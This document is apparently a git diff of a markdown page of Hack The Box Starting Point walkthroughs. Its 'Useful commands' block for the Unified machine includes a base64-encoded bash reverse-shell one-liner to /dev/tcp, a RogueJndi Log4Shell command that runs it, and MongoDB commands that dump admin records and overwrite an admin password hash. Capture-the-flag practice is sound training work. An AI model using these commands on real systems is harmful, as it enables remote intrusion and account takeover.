@@ -14,6 +14,7 @@
 ## Mini-walkthroughs for Hack The Box! 
 
 [Unified](https://app.hackthebox.com/starting-point/#unified)
+
 <div class="mermaid">
 graph LR
 
@@ -49,12 +50,8 @@ Useful commands
 ```bash 
 echo 'bash -c bash -i >&/dev/tcp/{IP}/{port} 0>&1' | base64
 
-
-
 java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,BASE64 STRING HERE}|{base64,-d}|{bash,-i}" \
 --hostname "{YOUR TUN0 IP ADDRESS}"
-
-
 
 curl 'https://10.129.12.182:8443/api/login' \
 -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' \
@@ -72,10 +69,7 @@ mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
 mongo --port 27117 ace --eval 'db.admin.update({"_id":\
 ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"SHA_512 Hash Generated"}})'
 
-
 ```
-
-
 
 
 [Vaccine](https://app.hackthebox.com/starting-point/#vaccine)
